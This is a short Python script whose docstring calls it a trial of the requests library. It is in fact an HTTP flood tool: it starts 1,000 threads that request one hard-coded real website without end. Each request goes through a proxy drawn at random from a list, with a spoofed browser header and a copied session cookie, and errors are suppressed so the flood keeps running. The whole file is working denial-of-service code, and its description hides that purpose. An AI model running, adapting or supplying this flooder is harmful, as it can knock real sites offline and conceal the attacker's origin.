# -*- encoding=utf-8 -*-
"""
    python: 3.5
    author: yjy
    time: 2016-10-20
    desc: requests模块试用
"""
import requests
import json
import threading
import sys
import random
import math
import socket


class Req:
    def __init__(self, url, method="get", headers=None, threadnum=1 ):
        self.url = url
        self.threadnum = threadnum
        self.method = method
        self.headers = headers
        self.threads = []
        self.creatednum = 0
        iptxt = open("ip.txt", 'r')
        self.ips = iptxt.readlines()
        iptxt.close()

    def http_loop(self):
        try:
            while 1:
                self.http_conn()
        except:
            self.creatednum -= 1
            if self.creatednum == 0:
                sys.exit(1)
            else:
                print("you have a new dead thread,now you still have threads:", str(self.creatednum))

    def http_conn(self):
        try:
            socket.setdefaulttimeout(5)
            rani = math.floor(random.random()*len(self.ips))
            ip = self.ips[rani].replace("\n", '')
            proxies = {"http": 'http://' + ip + '/', "https": 'http://' + ip + '/'}
            if self.method.lower() == "get":
                requests.get(self.url, data=None, headers=self.headers, proxies=proxies)
            else:
                requests.post(self.url, data=None, json=None, headers=self.headers, proxies=proxies)
        except:
            pass

    def start(self):
        try:
            while self.creatednum < self.threadnum:
                thread = threading.Thread(target=self.http_loop, args={})
                thread.start()
                self.threads.append(thread)
                self.creatednum += 1
        except:
            pass
        print("完成创建线程，数量：", str(self.creatednum),"个")


if __name__ == "__main__":
    url = "http://www.langsspt.com/index.php/Mission/index"
    headers = {'user_agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 \
                 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36',
               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
               'Cache-Control': 'no-cache',
               'Cookie': 'ktime_20160611/www.langsspt.com=-2; \
               CNZZDATA1259850767=1288913953-1474188322-%7C1474445218; \
               PHPSESSID=sf923pkrjn69t09kiqo73sqip3'
               }
    threadnum = 1000
    req = Req(url,"get",headers, threadnum)
    req.start()
